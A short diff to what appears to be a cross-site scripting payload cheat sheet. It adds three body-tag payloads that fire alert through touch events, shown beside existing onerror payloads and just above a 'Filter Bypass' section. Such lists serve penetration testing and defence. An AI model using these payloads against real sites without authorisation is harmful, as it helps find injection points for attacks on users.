@@ -12,6 +12,9 @@
 <script src=x onerror=alert(0)>
 <img src=x onerror=alert`1`>
 <img src=x onerror=confirm`1`>
+<body ontouchstart=alert(45)> 
+<body ontouchend=alert(45)>   
+<body ontouchmove=alert(45)>
 ```
 
 #### 3.1 Filter Bypass
